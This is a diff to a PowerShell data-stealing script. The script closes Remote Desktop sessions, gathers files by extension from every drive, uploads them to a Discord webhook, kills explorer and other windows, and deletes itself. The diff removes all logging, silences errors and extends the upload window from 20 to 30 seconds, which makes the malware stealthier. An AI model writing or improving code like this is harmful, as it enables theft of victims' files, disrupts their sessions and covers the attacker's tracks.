@@ -1,22 +1,5 @@
-# Define the log file path
-$logFile = "C:\Users\Public\Documents\log.txt"
-
-# Function to log messages
-function Log-Message {
-    param (
-        [string]$message
-    )
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    $logMessage = "$timestamp - $message"
-    Add-Content -Path $logFile -Value $logMessage
-}
-
-# Log the start of the script
-Log-Message "Script started."
-
 # Function to close any active Remote Desktop connections
 function Close-RemoteDesktopConnections {
-    Log-Message "Closing any active Remote Desktop connections."
     $rdpProcesses = Get-Process -Name mstsc -ErrorAction SilentlyContinue
     foreach ($process in $rdpProcesses) {
         Stop-Process -Id $process.Id -Force
@@ -29,8 +12,7 @@ function Upload-FileToDiscord {
         [string]$filePath,
         [string]$webhookUrl
     )
-    
-    Log-Message "Uploading file: $filePath"
+
     $fileName = [System.IO.Path]::GetFileName($filePath)
     $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
 
@@ -66,10 +48,8 @@ function Upload-FileToDiscord {
         $reader.Close()
         $webResponseStream.Close()
         $webResponse.Close()
-
-        Log-Message "File uploaded successfully: $filePath"
     } catch {
-        Log-Message "Failed to upload file: $filePath. Error: $($_.Exception.Message)"
+        # Handle any errors that occur during the upload
     }
 }
 
@@ -80,7 +60,6 @@ function Get-FilesInRotation {
         [array]$extensions
     )
 
-    Log-Message "Getting files in rotation from: $rootPath"
     $files = @()
     foreach ($extension in $extensions) {
         $files += Get-ChildItem -Path $rootPath -Filter "*.$extension" -Recurse -ErrorAction SilentlyContinue
@@ -90,7 +69,6 @@ function Get-FilesInRotation {
 
 # Function to close all windows
 function Close-AllWindows {
-    Log-Message "Closing all windows."
     Stop-Process -Name powershell -Force
     Stop-Process -Name notepad -Force
     Stop-Process -Name explorer -Force
@@ -110,20 +88,17 @@ foreach ($drive in $drives) {
     $files = Get-FilesInRotation -rootPath $drive.Root -extensions $extensions
     foreach ($file in $files) {
         $currentTime = Get-Date
-        if (($currentTime - $startTime).TotalSeconds -gt 20) {
+        if (($currentTime - $startTime).TotalSeconds -gt 30) {
             break
         }
         Upload-FileToDiscord -filePath $file.FullName -webhookUrl $webhookUrl
     }
 }
 
-# Close all windows and stop the script after 20 seconds
-Start-Sleep -Seconds 20
+# Close all windows and stop the script after 30 seconds
+Start-Sleep -Seconds 30
 Close-AllWindows
 
 # Remove the PowerShell script file after execution
 $scriptPath = $MyInvocation.MyCommand.Definition
 Remove-Item -Path $scriptPath -Force
-
-# Log the end of the script
-Log-Message "Script ended."
